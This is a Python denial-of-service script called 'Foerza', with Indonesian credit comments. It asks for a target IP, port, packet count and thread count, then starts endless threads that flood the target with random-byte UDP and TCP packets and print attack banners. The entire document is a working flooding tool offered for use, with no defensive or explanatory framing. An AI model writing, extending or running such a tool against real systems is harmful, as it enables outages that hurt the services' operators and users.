#!/usr/bin/env python3
#Yahahahahaha Hapus Credit/rename gw doain tobat lu
#semoga harimu menyenangkan

import random
import socket
import threading
import os,sys

os.system("clear")
print("Foerza")
ip = str(input(" Ip:"))
port = int(input(" Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
os.system("clear")
def ddos():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Foerza Attack!!!")
		except:
			print("[!] Downin Oleh Foerza!!!")

def ddos2():
	data = random._urandom(180)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Foerza Attack!!!")
		except:
			s.close()
			print("[!] Down!!!")

def ddos3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Foerza Attack!!!")
		except:
			s.close()
			print("[!] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()    
